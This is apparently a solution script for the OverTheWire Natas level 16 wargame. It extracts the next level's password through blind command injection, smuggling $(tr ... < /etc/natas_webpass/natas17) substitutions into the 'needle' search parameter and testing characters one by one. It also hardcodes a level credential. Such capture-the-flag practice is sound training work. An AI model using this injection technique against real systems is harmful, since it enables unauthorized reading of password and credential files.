#!/usr/bin/env python3
import string
import requests

auth_username = 'natas16'
auth_password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = 'http://natas16.natas.labs.overthewire.org/'
needle = '$(expr substr $(tr {} {} < /etc/natas_webpass/natas17) {} 1)'
passwd = ''
empty_pre_str = '<pre>\n</pre>'

def is_letter_after_trans(src_set, dst_set, pos):
    params = {
        'needle': needle.format(src_set, dst_set, pos)
    }
    r = requests.get(url, params=params, auth=(auth_username,auth_password))
    if empty_pre_str in r.text:
        return False
    else:
        return True

for i in range(1, 33):
    if is_letter_after_trans('_', '_', i):
        # postion [i] is a letter
        for char in string.ascii_letters:
            if not is_letter_after_trans(char, '_', i):
                passwd += char
                break
    else:
        # position [i] is a digit
        for char in string.digits:
            if is_letter_after_trans(char, 'a', i):
                passwd += char
                break
    print(passwd)
    